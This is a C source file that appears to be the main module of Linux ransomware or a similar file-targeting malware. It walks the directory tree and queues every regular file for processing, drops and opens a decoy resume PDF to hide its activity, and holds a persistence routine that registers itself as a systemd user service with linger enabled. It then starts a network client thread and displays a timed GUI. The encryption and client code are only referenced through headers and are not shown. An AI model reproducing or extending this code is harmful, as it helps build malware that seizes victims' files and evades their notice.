#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include "time.h" 

#include "../../headers/encryption.h"
#include "../../headers/globals.h"
#include "../../headers/client.h"
#include "../../headers/watcher.h"
#include "../../headers/pdf_data.h"
#include "../../headers/gui.h"

void start_up_register() {
    char self_path[256];
    char service_file[512];
    char cmd[256];
    FILE *f;

    int rd = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if (rd < 0) return;
    self_path[rd] = '\0';

    snprintf(service_file, sizeof(service_file),"%s/.config/systemd/user/myapp.service", getenv("HOME"));

    f = fopen(service_file, "w");
    if (!f) return;

    fprintf(f,
        "[Unit]\nDescription=myapp\n\n"
        "[Service]\nExecStart=%s\n\n"
        "[Install]\nWantedBy=default.target\n",
        self_path);
    fclose(f);

    system("systemctl --user daemon-reload");
    system("systemctl --user enable myapp.service");

    snprintf(cmd, sizeof(cmd), "loginctl enable-linger %s", getenv("USER"));
    system(cmd);
}

void open_pdf() {
    const char *temp_path = "/tmp/resume.pdf";

    FILE *f = fopen(temp_path, "wb");
    if (!f) return;
    fwrite(sample_pdf, 1, sample_pdf_len, f);
    fclose(f);

    char cmd[256];
    snprintf(cmd, sizeof(cmd), "xdg-open '%s' &", temp_path);
    system(cmd);
}

void traverse(const char *path) {

    struct dirent *entry;
    DIR *dir = opendir(path);

    if (!dir) {
        perror("opendir");
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (is_skipped(entry->d_name)){
            continue;
        }

        char fullPath[1024];
        if (snprintf(fullPath, sizeof(fullPath), "%s/%s", path, entry->d_name) >= sizeof(fullPath)) {
            fprintf(stderr, "Path too long: %s/%s\n", path, entry->d_name);
            continue;
        }

        struct stat statbuf;
        if (lstat(fullPath, &statbuf) == -1) {
            perror("lstat");
            continue;
        }

        if (S_ISLNK(statbuf.st_mode)) {
            continue;
        }

        if (S_ISDIR(statbuf.st_mode)) {
            //printf("Directory: %s\n", fullPath);
            traverse(fullPath);  // recursive call
        } else if (S_ISREG(statbuf.st_mode)) {
            //printf("File: %s\n", fullPath);
            enqueue(&queue, fullPath);
        }
    }
    closedir(dir);
}

int main() {
    // start_path ist jetzt in globals.c definiert, brauche den als global für watcher.
    
    //open_pdf(); Uncomment to open a pdf
    //start_up_register(); Uncomment to register the process as a startup

    initializeQueue(&queue);
    traverse(start_path);

    pthread_t client_tid;
    pthread_create(&client_tid, NULL, startclient, NULL);

    pthread_mutex_lock(&gui_mutex);
    pthread_cond_wait(&gui_cond, &gui_mutex);
    pthread_mutex_unlock(&gui_mutex);


    time_t start_time = time(NULL);
    while(watcher_on == true) {
        display_gui(start_time);
    }
    
    pthread_join(client_tid, NULL);

    return 0;
}
